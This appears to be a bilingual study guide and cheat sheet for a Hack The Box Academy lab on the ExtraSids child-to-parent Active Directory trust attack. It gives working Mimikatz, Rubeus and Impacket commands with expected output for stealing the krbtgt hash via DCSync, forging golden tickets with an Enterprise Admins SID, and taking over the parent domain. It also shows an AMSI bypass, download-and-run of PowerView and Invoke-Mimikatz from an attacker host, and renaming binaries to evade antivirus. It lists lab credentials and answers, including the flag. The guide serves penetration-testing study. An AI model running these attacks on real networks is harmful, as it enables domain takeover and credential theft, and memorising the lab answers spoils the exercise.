📄 ورقة غش السكشن — للسكرين شوت

  

🛑 هذه ورقة غش مخصصة لهجوم ExtraSids (Child -> Parent Trust). احتفظ بها قبل اللاب.

  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📄 ورقة غش: ExtraSids Attack (Child to Parent Trust)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  

🎯 هدف هذا السكشن بجملة: اختراق الدومين الرئيسي (Parent/Root Domain) بعد الحصول على Domain Admin في الدومين الفرعي (Child Domain) عبر حقن Enterprise Admin SID في تذكرة ذهبية.

  

⚔️ خوارزمية التطبيق:

  

1. اختراق الدومين الفرعي والحصول على صلاحيات عالية (Domain Admin).
    
      
    
2. استخراج KRBTGT Hash للفرع.
    
      
    
3. الحصول على SIDs (دومين الفرع + Enterprise Admins الأم).
    
      
    
4. بناء Golden Ticket بحقن الـ SID كـ ExtraSids.
    
      
    
5. حقن التذكرة في الذاكرة (PTT) وتنفيذ DCSync على الدومين الأم لاختراقه.
    
      
    

📐 جدول الأوامر الأساسية لهذا السكشن:

  

|**الهدف**|**الأمر**|**ملاحظة**|
|---|---|---|
|سحب KRBTGT Hash (Child)|`mimikatz # lsadump::dcsync /user:CHILD\krbtgt`|نفذه على الفرع لاختطاف التشفير.|
|معرفة SID الأم (Enterprise)|`Get-DomainGroup -Domain PARENT.LOCAL -Identity "Enterprise Admins"`|ينتهي بـ 519 دائماً.|
|صناعة وحقن التذكرة|`kerberos::golden /user:hacker /domain:CHILD.LOCAL /sid:<CHILD_SID> /krbtgt:<HASH> /sids:<EA_SID> /ptt`|أمر Mimikatz. استخدم FQDN كامل.|
|التأكد من التذكرة|`klist`|يجب أن تظهر التذكرة في الذاكرة.|
|هجوم DCSync النهائي|`lsadump::dcsync /user:PARENT\Administrator /domain:PARENT.LOCAL`|لسحب هاشات الدومين الأم.|

🔢 قيم وثوابت مهمة:

  

- `519`: الـ RID الثابت لـ Enterprise Admins.
    
      
    
- `502`: الـ RID الثابت لحساب KRBTGT.
    
      
    
- `RC4-HMAC` / `/rc4` : نوع التشفير الخاص بـ NTLM Hash في أوامر Rubeus.
    
      
    

🚨 الفخوخ الخاصة بهذا السكشن: ❌ استخدام NetBIOS name بدل الـ FQDN أثناء إنشاء التذكرة سيؤدي لفشلها. ❌ نسيان فلاج `/domain` في هجوم DCSync الأخير (سيوجه الهجوم للفرع بالخطأ). ❌ محاولة هذا الهجوم عبر External Trust (عبر الـ Forests) سيفشل بسبب وجود SID Filtering.

  

💡 Golden Tip:

دائماً تأكد من مسح التذاكر القديمة من الذاكرة باستخدام `klist purge` قبل حقن التذكرة الذهبية لتجنب تضارب الصلاحيات!

  

━━━━━

  

بهيج خلصنا. هسة عندك:

✅ ليش هذا الموضوع موجود (Big Picture)

✅ كل المصطلحات الجديدة بالسكشن

✅ كيف السكشن مبني وشنو يبي يعلمك

✅ الشرح العميق لكل مفهوم بأمثلة وتشبيهات

✅ ما لم يقله HTB (الـ gotchas والثغرات بالشرح)

✅ فلاشكاردز السكشن

✅ ورقة غش مخصصة للـ lab

  

الآن ارجع اقرأ نص السكشن الأصلي بـ HTB — وراح تلاحظ إن كل جملة صارت واضحة وإن فاهم ليش موجودة. بالتوفيق! 💪

---

```
  ══════════════════════════════════════════════════════════════════
  [✓] PHASE_I EXTRACTION COMPLETE
  [✓] THEORETICAL FRAMEWORK LOADED INTO MEMORY
  [→] TRANSITIONING TO LIVE CHALLENGE ENVIRONMENT . . .
  ══════════════════════════════════════════════════════════════════
```

---

## 🎯 PHASE_II — حقل التدريب :: السؤال وطرق الحل الستة

> [!danger] ☣️ PHASE II INITIALIZED · LIVE CHALLENGE ENVIRONMENT **Language:** English — **Size:** ~2,000 Words **Content:** Official HTB question · Lab target setup · 6 attack methods against live infrastructure.

---

# 🏴 Attacking Domain Trusts — Child → Parent (ExtraSids Attack) from Windows

> **Lab Setup Summary:** You are connecting via RDP to **ACADEMY-EA-DC02** (IP: `10.129.180.47`), which is the **child domain** controller for `LOGISTICS.INLANEFREIGHT.LOCAL`. The **parent domain** is `INLANEFREIGHT.LOCAL`, and its DC is `ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`. Your goal is to cross the trust boundary and own the parent domain.

---

## 1. THE QUESTION & SYSTEMATIC THOUGHT PROCESS

### 🔍 Re-Stating the Questions (in Simple English)

| Question | What it's really asking |
|---|---|
| **Q1** | What unique ID number identifies the child domain `LOGISTICS.INLANEFREIGHT.LOCAL`? |
| **Q2** | What unique ID number identifies the "Enterprise Admins" group in the parent domain `INLANEFREIGHT.LOCAL`? |
| **Q3** | Use those two ID numbers + a forged Kerberos ticket to break into the parent DC and read a secret file. |

---

### 🧠 Foundational Concepts for the Absolute Beginner

Before the attack, you **must** understand these building blocks:

<details>
<summary>📘 Click to expand: Core Concepts Explained Simply</summary>

**Active Directory Forest & Domains:**
- Think of a **Forest** as a company's entire IT empire (e.g., `INLANEFREIGHT.LOCAL` is the HQ).
- **Child domains** are like branch offices that belong to the same empire (e.g., `LOGISTICS.INLANEFREIGHT.LOCAL`).
- A **trust** is an agreement between two domains: "I trust your users to visit my resources."

**SID (Security Identifier):**
- Every user, group, and **domain itself** gets a unique ID called a SID.
- Format: `S-1-5-21-[numbers]-[RID]`
- Example: `S-1-5-21-2806153819-209893948-922872689-500`
- The **last number** (RID) identifies the specific object (500 = Administrator, 519 = Enterprise Admins).
- Strip the last part → you get the **Domain SID**: `S-1-5-21-2806153819-209893948-922872689`

**KRBTGT Account:**
- Every domain has a special hidden account called `krbtgt`. Its **password hash** is used to **sign and encrypt all Kerberos tickets** in the domain.
- If you steal this hash, you can **forge any ticket** and impersonate anyone — including domain admins.

**Golden Ticket:**
- A **forged Kerberos TGT (Ticket Granting Ticket)** created using the stolen `krbtgt` hash.
- It tells Kerberos: "This user is [whoever I want], and they belong to [whatever groups I choose]."
- The domain controller **cannot distinguish it from a real ticket** because it's signed with the real key.

**SID History:**
- When companies merge AD domains, users get a new SID in the new domain. Their **old SID is stored in `SID History`**.
- During Kerberos authentication, Windows includes ALL SIDs (current + history) in a structure called the **PAC (Privilege Attribute Certificate)** inside the ticket.
- Windows uses those SIDs to decide: "What access does this user get?"

**The ExtraSids Attack (The Core Exploit):**
- We forge a Golden Ticket for the child domain, but we **inject the Enterprise Admins SID** (from the parent domain) into the `SID History` field (`/sids:` in Mimikatz).
- When this ticket crosses the trust boundary to the parent domain, the parent DC reads the PAC, sees "Enterprise Admins" in SID History, and grants **FULL FOREST-WIDE ADMIN ACCESS**.
- **Why does this work?** Because Microsoft does NOT enable SID filtering (a protection that strips foreign SIDs) on **intra-forest trusts** (same-forest parent/child relationships) by default. It would break normal forest operations.

</details>

---

### 🎯 The Attack Chain (Hacker's Mental Model)

```
YOU ARE HERE (htb-student_adm on ACADEMY-EA-DC02)
         ↓
[STEP 1] Get child domain SID (LOGISTICS SID)
         ↓
[STEP 2] Get Enterprise Admins SID from parent domain (INLANEFREIGHT SID + -519)
         ↓
[STEP 3] DCSync → steal KRBTGT NTLM hash from child domain
         ↓
[STEP 4] Forge Golden Ticket with Enterprise Admins SID in /sids parameter
         ↓
[STEP 5] Inject ticket into memory (pass-the-ticket)
         ↓
[STEP 6] Access ACADEMY-EA-DC01 (parent DC) as Enterprise Admin → read flag
```

**Justification for this approach:** We already have Domain Admin in the child domain (the account `htb-student_adm` has DA rights). This gives us DCSync rights. The child/parent trust has no SID filtering. The combination of a forged ticket + Enterprise Admins SID in SID History = complete compromise of the parent domain.

---

## 2. SIX DISTINCT SOLUTION APPROACHES

---

### 🔵 Approach 1 — PowerView + Mimikatz (The HTB Academy Standard Path)

> **The recommended starting point for any CPTS exam.** This is exactly what the module teaches.

**Phase 0 — Connect via RDP (from your Kali/attack machine)**

```bash
xfreerdp /v:10.129.180.47 /u:htb-student_adm /p:'HTB_@cademy_stdnt_admin!' /cert-ignore /dynamic-resolution
```

Once connected, open **PowerShell as Administrator** on ACADEMY-EA-DC02.

---

**Phase 1 — Load PowerView & Get the Child Domain SID (Q1)**

```powershell
# Bypass execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process -Force

# Load PowerView (it is pre-installed on HTB Academy machines)
Import-Module C:\Tools\PowerView.ps1

# Get the SID of the CURRENT domain (child domain: LOGISTICS.INLANEFREIGHT.LOCAL)
Get-DomainSID
```

**✅ Expected Output:**
```
S-1-5-21-2806153819-209893948-922872689
```
> 📌 **This is your answer to Question 1.** Copy this value exactly — you will need it later.

**❌ Failure Scenarios:**
- `Import-Module` fails with "file not found" → PowerView is in a different path; try `Get-ChildItem -Recurse C:\ -Filter PowerView.ps1 -ErrorAction SilentlyContinue`
- `Get-DomainSID` returns nothing → PowerView failed to load; check for AV blocking (covered in What-If #1)
- Execution Policy error → Run `powershell -ep bypass` to open a new shell with bypass

**🔄 Pivot Trigger:** If `Get-DomainSID` returns no output or an error after importing, stop and move to Approach 3 (native cmdlets) immediately.

---

**Phase 2 — Get Enterprise Admins SID from Parent Domain (Q2)**

```powershell
# Query the PARENT domain for the Enterprise Admins group SID
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname, objectsid
```

**✅ Expected Output:**
```
distinguishedname                                         objectsid
-----------------                                         ---------
CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL   S-1-5-21-3842939050-3880317879-2865463114-519
```

> 📌 **This is your answer to Question 2.** Note that the SID ends in **-519** — this is the well-known RID for the Enterprise Admins group.

**❌ Failure Scenarios:**
- "Cannot contact domain" error → DNS resolution issue; try pointing to the parent DC explicitly: add `-Server ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`
- Empty result → Group name might differ by language; try `Get-DomainGroup -Domain INLANEFREIGHT.LOCAL | Where-Object {$_.SID -match "-519$"}`

**🔄 Pivot Trigger:** If you can't reach the parent domain at all from PowerView, use Approach 3 (native cmdlets) or calculate the SID manually (parent domain SID + "-519").

---

**Phase 3 — Get KRBTGT Hash via DCSync (Mimikatz)**

```powershell
# Navigate to Mimikatz
cd C:\Tools\mimikatz\

# Launch Mimikatz
.\mimikatz.exe
```

Inside the Mimikatz prompt:
```
privilege::debug
lsadump::dcsync /user:LOGISTICS\krbtgt
```

> **What is DCSync?** Mimikatz pretends to be another Domain Controller and asks ACADEMY-EA-DC02 to "replicate" (sync) the `krbtgt` account's password data. This is legitimate DC behavior, so it works without touching LSASS memory directly.

**✅ Expected Output (look for `Hash NTLM`):**
```
[DC] 'LOGISTICS.INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'LOGISTICS\krbtgt' will be the user account

Object RDN           : krbtgt

** SAM ACCOUNT **
SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
Object Security ID   : S-1-5-21-2806153819-209893948-922872689-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 9d765b482771505cbe97411065964d5f
    ntlm- 0: 9d765b482771505cbe97411065964d5f
    lm  - 0: 69df324191d4a80f0ed100c10f20561e
```

> 📌 **Copy the `Hash NTLM` value** — this is your KRBTGT hash. Your value will differ from this example.

**❌ Failure Scenarios:**
- `ERROR kuhl_m_privilege_debug` → You are not running as Administrator; reopen PowerShell as Admin
- Access denied on DCSync → The account doesn't have DA/replication rights; verify `htb-student_adm` is in Domain Admins
- Mimikatz is quarantined by AV → See What-If #2

**🔄 Pivot Trigger:** If `privilege::debug` returns "ERROR," immediately open a new PowerShell window with "Run as Administrator" and retry. If Mimikatz is deleted/blocked, move to Approach 4 or Approach 5.

---

**Phase 4 — Create the Golden Ticket with ExtraSids (still inside Mimikatz)**

Replace the placeholders below with YOUR actual values from Phases 1-3:

```
kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```

| Parameter | What it means |
|---|---|
| `/user:hacker` | The username written inside the ticket (can be ANY name, even fake — hacker is fine) |
| `/domain:` | The **child** domain FQDN |
| `/sid:` | The **child** domain SID (your Q1 answer) |
| `/krbtgt:` | The NTLM hash you got in Phase 3 |
| `/sids:` | The **Enterprise Admins SID** from the parent domain (your Q2 answer ending in -519) |
| `/ptt` | Pass-the-Ticket: inject this ticket directly into your current session's memory |

**✅ Expected Output:**
```
User      : hacker
Domain    : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)
SID       : S-1-5-21-2806153819-209893948-922872689
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-3842939050-3880317879-2865463114-519 ;
ServiceKey: 9d765b482771505cbe97411065964d5f - rc4_hmac_nt
Lifetime  : [date] ; [date] ; [date]
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'hacker @ LOGISTICS.INLANEFREIGHT.LOCAL' successfully submitted for current session
```

**❌ Failure Scenarios:**
- "SID is invalid" → Double-check the child domain SID format (must be `S-1-5-21-X-X-X`, no trailing RID)
- Ticket created but doesn't work → The `/sids:` SID might be wrong; verify with Approach 3

**🔄 Pivot Trigger:** If the ticket is created but access to the parent DC still fails in Phase 5, move to Approach 2 (Rubeus) which has better Kerberos handling in some environments.

---

**Phase 5 — Verify Ticket and Read the Flag (Q3)**

Exit Mimikatz (`exit`) and verify the ticket is in memory:

```powershell
klist
```

**✅ Expected Output:**
```
Current LogonId is 0:0x12d5f3

Cached Tickets: (1)

#0>     Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
        Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        ...
```

Now access the parent DC's C: drive and read the flag:

```powershell
# First, confirm we CANNOT access without the ticket (before this step, it fails)
# Now with the ticket injected, this should WORK:
ls \\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\c$\ExtraSids\

# Read the flag file
type \\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\c$\ExtraSids\flag.txt
```

**✅ Expected Output:**
```
    Directory: \\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\c$\ExtraSids

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        [date]              [size] flag.txt

f@ll1ng_l3@ves   ← (Your actual flag will be here)
```

> 📌 **The content of `flag.txt` is your answer to Question 3.**

**❌ Failure Scenarios:**
- "Access denied" → The ticket wasn't injected (check `klist`); retry the `/ptt` step
- "Name not resolved" → DNS issue; use the IP approach: `ls \\<PARENT_DC_IP>\c$\ExtraSids\`
- Empty `klist` → Ticket expired or wasn't injected; re-run Mimikatz phase

**🔄 Pivot Trigger:** If `ls` on the parent DC returns "Access Denied" after verifying the ticket is in memory via `klist`, move to Approach 2 (Rubeus) immediately.

---

### 🟢 Approach 2 — PowerView + Rubeus (Alternative Golden Ticket Creator)

> Use this when Mimikatz's `kerberos::golden` is flagged by AV but Rubeus is still available.

**Get SIDs:** Same as Approach 1, Phases 1 & 2.

**Get KRBTGT hash:** Same as Approach 1, Phase 3 (still need Mimikatz for DCSync, or use secretsdump from Linux).

**Create Golden Ticket with Rubeus:**

```powershell
# Exit Mimikatz first, then:
cd C:\Tools\

.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```

> **Key difference:** Rubeus uses `/rc4:` for the KRBTGT hash (instead of `/krbtgt:` in Mimikatz), but the result is the same — a Golden Ticket injected into memory.

**✅ Expected Output:**
```
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: Build TGT

[*] Building PAC

[*] domain          : LOGISTICS.INLANEFREIGHT.LOCAL
[*] user            : hacker
[*] userid          : 500
[*] groups          : 520,512,513,519,518
[*] extraSids       : S-1-5-21-3842939050-3880317879-2865463114-519
[*] sname           : krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL
[*] crypto          : rc4_hmac
[*] ptt             : True

[+] Ticket successfully imported!
```

**Verify and read flag:** Same as Approach 1, Phase 5.

**✅ Expected Output (klist):**
```
#0>     Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
        Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
```

**❌ Failure Scenarios:**
- Rubeus outputs "KRB-ERROR (24): KDC_ERR_PREAUTH_FAILED" → Wrong KRBTGT hash; re-run DCSync
- `/ptt` injection fails → Try saving to file with `/outfile:ticket.kirbi` then `.\Rubeus.exe ptt /ticket:ticket.kirbi`

**🔄 Pivot Trigger:** If Rubeus itself is blocked by AV, move to Approach 5 (Impacket from Linux) where you create the ticket remotely.

---

### 🟡 Approach 3 — Native Windows AD PowerShell Module (No PowerView Required)

> Use this when PowerView is blocked or unavailable. Every Domain Controller has the `ActiveDirectory` module built in.

**Get Child Domain SID (Q1):**

```powershell
# Method A: Get-ADDomain (simplest)
(Get-ADDomain).DomainSID.Value

# Method B: Parse from current user's SID (whoami)
$sid = (whoami /user)[3].Split()[-1]     # Gets something like S-1-5-21-XXX-XXX-XXX-1106
$domainSID = $sid.Substring(0, $sid.LastIndexOf('-'))  # Strips the RID
Write-Host "Child Domain SID: $domainSID"

# Method C: From any domain user
(Get-ADUser -Identity krbtgt).SID.AccountDomainSid.Value
```

**✅ Expected Output:**
```
S-1-5-21-2806153819-209893948-922872689
```

**Get Enterprise Admins SID (Q2):**

```powershell
# Method A: Direct group query to parent domain
(Get-ADGroup -Identity "Enterprise Admins" -Server INLANEFREIGHT.LOCAL).SID.Value

# Method B: Calculate it (Enterprise Admins is ALWAYS parent_domain_SID + -519)
$parentSID = (Get-ADDomain -Identity INLANEFREIGHT.LOCAL).DomainSID.Value
Write-Host "Enterprise Admins SID: $parentSID-519"
```

**✅ Expected Output:**
```
S-1-5-21-3842939050-3880317879-2865463114-519
```

**Remaining steps:** Same as Approach 1, Phases 3-5.

**❌ Failure Scenarios:**
- `Get-ADDomain` fails → The RSAT ActiveDirectory module isn't loaded; run: `Import-Module ActiveDirectory`
- `-Server INLANEFREIGHT.LOCAL` fails → Cannot resolve parent domain hostname; use parent DC's IP address instead

**🔄 Pivot Trigger:** If all AD module commands fail, use `whoami /user` to manually parse your own SID (Method B above) — this always works.

---

### 🟠 Approach 4 — Using `lsadump::lsa /patch` Instead of DCSync

> Use this when the domain controller you're on is **not** the PDC Emulator and DCSync fails with replication permission errors. This method directly patches LSASS memory to extract hashes but requires SYSTEM-level access.

```
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::lsa /patch
```

**✅ Expected Output (look for krbtgt):**
```
Domain : LOGISTICS / S-1-5-21-2806153819-209893948-922872689

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 9d765b482771505cbe97411065964d5f

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : bdaffbfe64f1fc646a3353be1c2c3c99
...
```

> ⚠️ **Warning:** `lsadump::lsa /patch` is LOUDER than DCSync. It patches LSASS in memory and is more likely to trigger AV/EDR. In a real engagement, prefer DCSync.

**❌ Failure Scenarios:**
- `token::elevate` fails → You're not running as NT AUTHORITY\SYSTEM; need to escalate first (via a service exploit or by running Mimikatz from an admin process)
- Output is garbled / hashes are all zeroes → Credential Guard is protecting LSASS

**🔄 Pivot Trigger:** If `lsadump::lsa /patch` is blocked or gives zeroes, move to Approach 5 (Impacket from Linux) which performs DCSync remotely over the network.

---

### 🔴 Approach 5 — Impacket from Linux (Full Remote Attack, No Mimikatz/Rubeus)

> Use this when you cannot run executables on the Windows machine (AV is too aggressive), but you still have Domain Admin credentials.

**Setup on your Kali/Parrot OS machine:**

```bash
# Add hostnames to /etc/hosts (use the child DC's IP for both domains' resolution)
echo "10.129.180.47  ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL LOGISTICS.INLANEFREIGHT.LOCAL" | sudo tee -a /etc/hosts

# Find the parent DC's IP from within Windows first (or via nslookup/Resolve-DnsName)
# Then add it too:
echo "<PARENT_DC_IP>  ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL INLANEFREIGHT.LOCAL" | sudo tee -a /etc/hosts
```

```bash
# Step 1: DCSync to get KRBTGT hash (from Linux!)
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py \
  -just-dc-user LOGISTICS/krbtgt \
  LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm:'HTB_@cademy_stdnt_admin!'@10.129.180.47
```

**✅ Expected Output:**
```
Impacket v0.10.0 - ...

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
```
> The last field (`9d765b...`) is the **NTLM hash of KRBTGT**.

```bash
# Step 2: Create Golden Ticket using Impacket's ticketer.py
python3 /usr/share/doc/python3-impacket/examples/ticketer.py \
  -nthash 9d765b482771505cbe97411065964d5f \
  -domain-sid S-1-5-21-2806153819-209893948-922872689 \
  -domain LOGISTICS.INLANEFREIGHT.LOCAL \
  -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 \
  hacker
```

**✅ Expected Output:**
```
Impacket v0.10.0 - ...

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for LOGISTICS.INLANEFREIGHT.LOCAL/hacker
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Saving ticket in hacker.ccache
```

```bash
# Step 3: Export the ticket for use
export KRB5CCNAME=./hacker.ccache

# Step 4: Read the flag using Impacket's smbclient
python3 /usr/share/doc/python3-impacket/examples/smbclient.py \
  -k -no-pass \
  INLANEFREIGHT.LOCAL/hacker@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

# Inside the smbclient shell:
# use c$
# cd ExtraSids
# get flag.txt
# exit
```

**❌ Failure Scenarios:**
- Kerberos clock skew error ("KRB_AP_ERR_SKEW") → Your Kali clock is out of sync with the DC; run `sudo ntpdate 10.129.180.47`
- Name resolution fails → Verify `/etc/hosts` entries are correct; try using IP directly
- "No credentials found" → The `.ccache` file path is wrong; check `$KRB5CCNAME`

**🔄 Pivot Trigger:** If Kerberos from Linux keeps failing, fall back to RDP (Approach 1) and use the Windows tools directly.

---

### 🟣 Approach 6 — BloodHound for Recon + Mimikatz with Ticket File Export

> Use this in real engagements where you want to **visualize** the trust path before attacking and need to **save the ticket as a file** for persistence/re-use.

**Step 1 — Run BloodHound Collector (SharpHound) to map the trust**

```powershell
# Run SharpHound to collect all AD data including trust relationships
cd C:\Tools\
.\SharpHound.exe -c All --domain LOGISTICS.INLANEFREIGHT.LOCAL --zipfilename child_domain.zip
```

Upload the resulting `.zip` to BloodHound GUI and search for the path from `LOGISTICS.INLANEFREIGHT.LOCAL` to `INLANEFREIGHT.LOCAL`. You will visually see the trust path and confirm the ExtraSids attack vector.

**Step 2 — Create Golden Ticket as a FILE (not injected, for reuse)**

```
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ticket:hacker.kirbi
```

> **Key difference:** No `/ptt` → ticket is saved to `hacker.kirbi` file instead of injected into memory. This is useful for persistence or transferring to another machine.

**Step 3 — Import the ticket when needed**

```
mimikatz # kerberos::ptt hacker.kirbi
```

Or with Rubeus:
```powershell
.\Rubeus.exe ptt /ticket:hacker.kirbi
```

**Step 4 — Read the flag (same as always)**

```powershell
klist
type \\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\c$\ExtraSids\flag.txt
```

**❌ Failure Scenarios:**
- SharpHound triggers AV → Use the `-s` (stealth) flag or collect with `--CollectionMethods DCOnly` for quieter collection
- `.kirbi` file import fails → File may be corrupted; regenerate the ticket

**🔄 Pivot Trigger:** If BloodHound collection is blocked, skip the visualization step and proceed directly with the SID enumeration from Approach 1. BloodHound is nice-to-have intelligence, not required for the attack.

---

## 3. THE "WHAT IF" MASTERCLASS (6 Scenarios for CPTS Preparation)

---

### 🔥 What If #1 — PowerView Is Detected and Deleted by AV?

> **Symptom:** You run `Import-Module C:\Tools\PowerView.ps1` and the file disappears or you get a security warning.

**Solution:** Use only **built-in Windows tools** — they're never flagged:

```powershell
# Get child domain SID (native)
(Get-ADDomain).DomainSID.Value

# Get Enterprise Admins SID (native) — remember: it's ALWAYS parent_SID + -519
$parentSID = (Get-ADDomain -Identity INLANEFREIGHT.LOCAL).DomainSID.Value
Write-Host "$parentSID-519"
```

Alternatively, **download PowerView from memory** (AMSI bypass, advanced):
```powershell
# AMSI bypass (for lab learning purposes only)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Now import PowerView from network share or encode it as base64 to avoid disk write
IEX(New-Object Net.WebClient).DownloadString('http://<YOUR_IP>/PowerView.ps1')
```

> **CPTS Lesson:** Always know the native Windows equivalent for every PowerView function. AV evasion is a real exam and real-world skill.

---

### 🔥 What If #2 — Mimikatz Is Blocked by AV/Windows Defender?

> **Symptom:** `.\mimikatz.exe` is immediately quarantined, or you see "Access denied."

**Solutions (multiple layers):**

```powershell
# Option A: Run Mimikatz from memory (no disk write)
IEX (New-Object Net.WebClient).DownloadString('http://<YOUR_IP>/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "lsadump::dcsync /user:LOGISTICS\krbtgt"'

# Option B: Rename the binary (sometimes bypasses simple hash-based detection)
Copy-Item C:\Tools\mimikatz.exe C:\Windows\Temp\svchost2.exe
C:\Windows\Temp\svchost2.exe

# Option C: Use Impacket's secretsdump from Linux (no Mimikatz needed at all)
python3 secretsdump.py LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm:'HTB_@cademy_stdnt_admin!'@10.129.180.47 -just-dc-user LOGISTICS/krbtgt
```

> **CPTS Lesson:** Always have multiple tools ready. On the CPTS exam, `secretsdump.py` from Linux is often the most reliable alternative to Mimikatz DCSync.

---

### 🔥 What If #3 — The Golden Ticket Is Created But Access to the Parent DC Is Still Denied?

> **Symptom:** `klist` shows the ticket is in memory, but `ls \\ACADEMY-EA-DC01...\c$` returns "Access is denied."

**Diagnosis and fix:**

```powershell
# Step 1: Verify the ticket IS there
klist

# Step 2: Check if you can resolve the parent DC's hostname
ping ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

# Step 3: If hostname fails, find the IP first
Resolve-DnsName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
# Then use IP directly:
ls \\<PARENT_DC_IP>\c$\ExtraSids\

# Step 4: If ticket is wrong, purge and recreate
klist purge
# Then re-run Mimikatz/Rubeus golden ticket command
```

**Common root cause:** The `/sids:` Enterprise Admins SID is wrong (typo or wrong domain SID). Verify it:
```powershell
# Verify Enterprise Admins SID one more time
Get-ADGroup "Enterprise Admins" -Server INLANEFREIGHT.LOCAL | select SID
```

> **CPTS Lesson:** `klist purge` is your best friend. If a ticket isn't working, purge all tickets and create a fresh one.

---

### 🔥 What If #4 — SID Filtering IS Enabled on the Trust? (Attack Fails Completely)

> **Symptom:** Despite a perfect Golden Ticket with ExtraSids, the parent domain still denies access. This means an administrator explicitly enabled SID filtering (Quarantine mode) on the intra-forest trust.

**How to detect:**
```powershell
# Check if SID filtering (Quarantine) is enabled on the trust
Get-ADTrust -Filter * | Select Name, SIDFilteringQuarantined, SIDFilteringForestAware
```
If `SIDFilteringQuarantined = True`, the ExtraSids attack is BLOCKED.

**Alternative attack paths when ExtraSids is blocked:**

```powershell
# Option A: Kerberoast in the parent domain
# (If you have ANY user in the parent domain, Kerberoast for service account hashes)
Get-DomainUser -SPN -Domain INLANEFREIGHT.LOCAL | select samaccountname

# Option B: Find any user with rights in the parent domain via BloodHound
# Look for "GenericAll", "WriteDACL", "ForceChangePassword" edges to parent domain objects

# Option C: Compromise a machine that has trusts to both domains
# Find a server in the DMZ that's joined to both domains (dual-homed)
```

> **CPTS Lesson:** The ExtraSids attack is the PRIMARY method for child-to-parent escalation. BUT if SID filtering is on, pivot to cross-domain Kerberoasting or ACL-based attacks. The CPTS exam may test your ability to recognize when an attack is blocked and pivot.

---

### 🔥 What If #5 — You Don't Know the IP Address of the Parent Domain Controller?

> **Symptom:** You have `ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL` as a hostname but can't ping it or access it by name from your Kali machine.

**From Windows (ACADEMY-EA-DC02), find the parent DC's IP:**

```powershell
# Method 1: DNS lookup
Resolve-DnsName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

# Method 2: nltest
nltest /dclist:INLANEFREIGHT.LOCAL

# Method 3: nslookup
nslookup ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

